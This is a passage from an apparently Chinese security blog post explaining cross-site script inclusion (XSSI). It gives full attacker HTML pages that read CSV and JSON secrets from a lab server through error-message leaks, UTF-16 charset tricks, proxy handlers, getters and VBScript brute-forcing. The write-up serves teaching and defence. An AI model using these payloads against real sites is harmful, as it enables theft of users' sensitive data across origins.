class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Function</span>.prototype.call = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> funcString = <span class="keyword">this</span>.toString();</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> emails = /<span class="keyword">var</span> emails = \[(.*)\]/g.exec(funcString)[<span class="number">1</span>];</span></span><br><span class="line"><span class="undefined">alert(emails);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/secret.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里就不通过Jquery往标签中写内容了，因为这里污染了Function的原型链会让Jquery在执行时报错。修改成弹框显示就好：</p><p><img src="/2020/01/04/浅析XSSI漏洞/24.png" alt=""></p><h3 id="针对非JavaScript类型文件"><a href="#针对非JavaScript类型文件" class="headerlink" title="针对非JavaScript类型文件"></a>针对非JavaScript类型文件</h3><p>某些场景下，目标文件并未JS类型，包含敏感信息的文件，其中的内容并不能直接作为一个JS变量的值读取，或者文件内容是多行的，这些都会使得XSSI的信息窃取变得很困难。</p><p>下面先看下之前wooyun的文章中说到的方法，但都有些历史了，这里本地测试下看看是否还能成功。其中涉及到的文件类型包括CSV、JSON等。</p><h4 id="IE-bug导致错误信息泄漏"><a href="#IE-bug导致错误信息泄漏" class="headerlink" title="IE bug导致错误信息泄漏"></a>IE bug导致错误信息泄漏</h4><p>这种方法的局限性在于ie的版本要小于10，且目前的Chrome和Firefox都不能成功利用。除此之外，获取的CSV中的内容只能获取第一行、第二列的内容，并不能全部获取得到。</p><blockquote><p>为了防止js错误信息跨域泄漏，对于外部加载的js文件，现在主流的浏览器只有固定的错误信息，比如“script error”，但是在ie9与ie10，情况不一定如此。</p><p>一般来说，在外部js发生语法错误的情况下，浏览器只会提供固定的错误信息，但是当在runtime发生错误的情况下，浏览器会提供详细的错误信息。比如”foo 未定义”之类的，某些浏览器一旦允许外域js回复详细的错误信息，就会导致信息泄漏。</p><p>就是说，当某个网页的内容能被js识别为javascript格式的话，那么就可能通过错误信息获取到目标的内容。</p></blockquote><p>假设目标服务端存在包含敏感信息的a.csv：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure><p>用软件打开就是这样的：</p><p><img src="/2020/01/04/浅析XSSI漏洞/11.png" alt=""></p><p>xssi.html，设置window.error的错误显示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set an error handler --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;alert(err)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在ie 8上攻击利用，可以看到会显示CSV文件的第一行、第二列的内容：</p><p><img src="/2020/01/04/浅析XSSI漏洞/12.png" alt=""></p><p>出现这种情况的原因在于，浏览器将目标CSV文件内容识别为JavaScript，其中age被识别为某个未定义的JS变量。当为这种情况的时候，浏览器就允许页面捕捉来自不同网页的错误信息。</p><p>在Chrome和Firefox，以及10版本以上的ie都不能成功。比如Firefox中并不会弹框，而是直接被浏览器拦截了获取CSV类型的响应：</p><p><img src="/2020/01/04/浅析XSSI漏洞/13.png" alt=""></p><h4 id="UTF-16编码窃取敏感信息"><a href="#UTF-16编码窃取敏感信息" class="headerlink" title="UTF-16编码窃取敏感信息"></a>UTF-16编码窃取敏感信息</h4><p>这种方法突破了前面只能对CSV信息进行窃取的尴尬局面，但局限性和前面的方法一样，仅在ie &lt; 10的版本下才能成功利用，因为ie 10会拒绝将没有空字节活着bom的编码为UTF-16。</p><p>这种方法的原理如下：</p><blockquote><p>使用<code>script</code>标签的<code>charset</code>属性将包含的文件编码为UTF-16，其目的在于强制文件的所有内容连为一体，变为一个未定义的Javascript变量。然后通过在window域内使用<code>onerror</code>捕获错误信息（此错误信息一定为<code>已编码的文件内容 is not defined</code>），再进行解码即可。此举其实是为了防止符号会引起Javascript出现其他异常，例如英文逗号会截断文件内容，报错只会显示逗号前的内容未定义；而中文逗号则会直接提示非法字符，从而获取不到任何敏感信息。</p></blockquote><p>a.json，假设的目标服务端保存着敏感数据的Json文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"username"</span>:<span class="string">"admin"</span>, <span class="attr">"token"</span>:<span class="string">"89uki4gk9iu9213trju"</span>&#125;</span><br></pre></td></tr></table></figure><p>xssi.html，在script标签中加入charset=”UTF-16BE”，同时通过window.error来捕获错误信息并弹框显示出来：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set an error handler --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;alert(err)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target JSON --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.json"</span> <span class="attr">charset</span>=<span class="string">"UTF-16BE"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地使用ie 8进行测试，弹框显示一段乱码内容，并识别该乱码为JS变量未定义：</p><p><img src="/2020/01/04/浅析XSSI漏洞/7.png" alt=""></p><p>乱码内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">笢畳敲湡浥∺≡摭楮∬•瑯步渢㨢㠹畫椴杫㥩甹㈱㍴牪產</span><br></pre></td></tr></table></figure><p>将这堆乱码再进行UTF-16BE编码等操作即可获取到原始内容·：</p><p><img src="/2020/01/04/浅析XSSI漏洞/8.png" alt=""></p><p>注意，这种方式成功的前提在于浏览器是否会将编码后的内容识别为JS的变量，若不能则无法利用成功。除了IE 10以上的版本，在当前的Chrome和Firefox中都是不能成功的，这是因为浏览器并未将编码后的内容识别为JS变量，自然而然地也就无法从window.error中捕获到乱码信息了：</p><p><img src="/2020/01/04/浅析XSSI漏洞/9.png" alt=""></p><p>下图是引自wooyun文章，能够被浏览器认定为有效的JS变量，当字符编码为UTF-16的时候的数字字母组合，ie 9将其99.3%认为是有效的js标示符，高于Chrome和Firefox：</p><p><img src="/2020/01/04/浅析XSSI漏洞/10.png" alt=""></p><h4 id="Harmony-proxy-bug-in-Firefox-Chrome"><a href="#Harmony-proxy-bug-in-Firefox-Chrome" class="headerlink" title="Harmony proxy bug in Firefox / Chrome"></a>Harmony proxy bug in Firefox / Chrome</h4><blockquote><p>Harmony是一个ECMAScript 6中的新功能，类似于Java的反射类，其中定义了对于对象属性的查找、分配、函数调用，在我们针对这些新特性的研究过程中发现该功能可以用于XSSI的攻击中。</p></blockquote><p>注意，这种方法在当前较新版本的Chrome和Firefox中都以失效。</p><p>和前面一样的a.csv：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure><p>xssi.html，其中<code>window.__proto__</code>定义了一个代理对象，当访问一个未定义的全局变量，就会出发handler进行处理：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- set proxy handler to window.__proto__ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> handler = &#123;</span></span><br><span class="line"><span class="actionscript">has: <span class="function"><span class="keyword">function</span><span class="params">(target, name)</span> </span>&#123;alert(<span class="string">"data="</span> + name); <span class="keyword">return</span> <span class="literal">true</span>&#125;,</span></span><br><span class="line"><span class="actionscript"><span class="keyword">get</span>: <span class="function"><span class="keyword">function</span><span class="params">(target, name)</span> </span>&#123;<span class="keyword">return</span> <span class="number">1</span>&#125;</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.__proto__ = <span class="keyword">new</span> <span class="built_in">Proxy</span>(&#123;&#125;, handler);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.130:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在本地测试没成功，显示不能给该对象设置prototype：</p><p><img src="/2020/01/04/浅析XSSI漏洞/14.png" alt=""></p><h4 id="穷举搜索"><a href="#穷举搜索" class="headerlink" title="穷举搜索"></a>穷举搜索</h4><p>穷举搜索简单地说就是在客户端使用某些方法来暴力破解目标文件中的敏感数据，分为下面三种类型。</p><h5 id="定义变量穷举CSV内容"><a href="#定义变量穷举CSV内容" class="headerlink" title="定义变量穷举CSV内容"></a>定义变量穷举CSV内容</h5><p>此方法适用于当前所有IE版本。</p><p>在前面IE Bug小节中说到了利用IE的Bug可以获取CSV中的第一行第二列的内容，这是因为IE浏览器将该内容当成JS变量然后报错显示错误信息导致信息泄露。现在这种方法的原理在于，我们在恶意页面中就穷举定义CSV中可能存在的项的内容，如果穷举成功、定义了该CSV项的值的变量，那么浏览器就不会报错，证明我们穷举成功。</p><p>在前面的基础上，我们可以通过定义变量的方式来穷举CSV中的所有内容（这里数值无法定义变量也就无法穷举出其值），同时也解决了一般情况下浏览器不提供详细的外部错误信息的问题，这样，即使在最新版的IE 11也能够成功进行利用。</p><p>假设a.csv如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name,age,address</span><br><span class="line">mi1k7ea,6,china</span><br></pre></td></tr></table></figure><p>xssi.html，先啥变量都不定义：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时会报age未定义，也就是CSV中的第一行第二列的内容，和前面的一样：</p><p><img src="/2020/01/04/浅析XSSI漏洞/16.png" alt=""></p><p>接着，修改xssi.html，添加age变量的定义：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时发现和前面的报错是一样的。没关系，我们直接修改xssi.html，添加age前面的name的变量的定义，发现报错信息就会往后识别了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> name = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/2020/01/04/浅析XSSI漏洞/17.png" alt=""></p><p>根据这个原理，我们就可以对CSV文件中的每一项的内容进行穷举，直至浏览器无报错时即穷举完成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> name = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> age = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> address = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> mi1k7ea = <span class="string">''</span>;</span></span><br><span class="line"><span class="actionscript"><span class="keyword">var</span> china = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/2020/01/04/浅析XSSI漏洞/18.png" alt=""></p><p>值得注意的是，CSV中的项若为数值，则无需我们定义该数值的变量、也无法定义该变量，换句话说，这种方式除了CSV中的数值项、其他的全部内容都能够被成功穷举出来。</p><h5 id="JS-getter穷举CSV内容"><a href="#JS-getter穷举CSV内容" class="headerlink" title="JS getter穷举CSV内容"></a>JS getter穷举CSV内容</h5><p>原理和上一小节定义变量大同小异，只是借助了JavaScript的getter方法来实现。</p><p>此方法同样适用于当前所有IE版本。</p><p>a.csv如上。</p><p>xssi.html，穷举过程和前面的类似，这里先对CVS中的几项进行定义穷举：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"name"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=name"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"age"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=age"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"address"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=address"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target CSV --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.csv"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>要是文件中每一项的内容被定义成功，则会逐个弹框显示出来，并且浏览器最后会报错有些像还未定义，当然显不显示具体的未定义的项的内容得看浏览器：</p><p><img src="/2020/01/04/浅析XSSI漏洞/19.png" alt=""></p><p><img src="/2020/01/04/浅析XSSI漏洞/20.png" alt=""></p><p>接着和前面小节一样，继续通过JS的getter来穷举出CSV文件内容中的其他项即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"name"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=name"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"age"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=age"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"address"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=address"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"mi1k7ea"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=mi1k7ea"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="javascript"><span class="built_in">Object</span>.defineProperty(<span class="built_in">window</span>, <span class="string">"china"</span>, &#123;<span class="attr">get</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;alert(<span class="string">"value=china"</span>)&#125;&#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>此时穷举完成，浏览器也没有报错，说明CSV文件中的每一项均已被定义穷举（当然，数值项是无法通过定义穷举到的，这个缺点和前面小节是一样的）：</p><p><img src="/2020/01/04/浅析XSSI漏洞/21.png" alt=""></p><h5 id="结合VBScript穷举JSON数组"><a href="#结合VBScript穷举JSON数组" class="headerlink" title="结合VBScript穷举JSON数组"></a>结合VBScript穷举JSON数组</h5><p>注意：VBScript只适用于IE中。此方法在我本地的IE 11中测试并不成功，而在IE 8上OK。</p><p>假设服务端存在包含敏感信息的文件a.json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">"admin"</span>,<span class="string">"this_is_password"</span>]</span><br></pre></td></tr></table></figure><p>xssi.html，这里script标签添加language属性值为vbscript，其中模拟穷举JSON数组内容进行暴力破解：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--恶意页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>XSSI Attack<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"password"</span>]: MsgBox <span class="string">"value=password"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"123456"</span>]: MsgBox <span class="string">"value=123456"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"admin"</span>]: MsgBox <span class="string">"value=admin"</span>: End Sub</span></span><br><span class="line"><span class="actionscript">Sub [<span class="string">"admin"</span>,<span class="string">"this_is_password"</span>]: MsgBox <span class="string">"value=this_is_password"</span>: End Sub</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- load target JSON as VBScript --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://192.168.10.131:81/a.json"</span> <span class="attr">language</span>=<span class="string">"vbscript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在IE 8中成功利用VBScript穷举出JSON数组中的敏感信息：</p><p><img src="/2020/01/04/浅析XSSI漏洞/15.png" alt=""></p><h4 id="利用敏感文件中的可控字段窃取数据"><a href="#利用敏感文件中的可控字段窃取数据" 